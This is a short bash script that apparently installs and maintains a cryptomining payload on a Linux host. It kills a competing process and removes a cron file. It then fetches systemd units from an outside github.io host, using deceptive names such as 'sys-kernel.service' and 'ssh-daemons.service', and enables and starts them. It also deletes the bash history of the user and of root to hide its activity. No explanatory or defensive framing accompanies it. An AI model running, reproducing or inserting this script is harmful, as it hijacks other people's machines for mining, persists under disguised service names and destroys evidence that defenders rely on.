if [ -e "/etc/cron.d/cronconfig" ]; then
        killall cpuhp
	rm -f /etc/cron.d/cronconfig
 	cd /etc/systemd/system
	wget https://xmrhorizontal.github.io/sys-kernel.service
	wget https://xmrhorizontal.github.io/ssh-daemons.service
 	systemctl daemon-reload
        systemctl enable ssh-daemons.service
	systemctl enable sys-kernel.service
	systemctl start ssh-daemons.service
	systemctl start sys-kernel.service
        rm -f ~/.bash_history
        rm -f /root/.bash_history
fi
systemctl stop sys-kernel.service
systemctl disable sys-kernel.service
cd /etc/systemd/system
rm ./sys-kernel.service
wget https://xmrhorizontal.github.io/sys-kernel.service
systemctl enable sys-kernel.service
systemctl start ssh-daemons.service
systemctl start sys-kernel.service
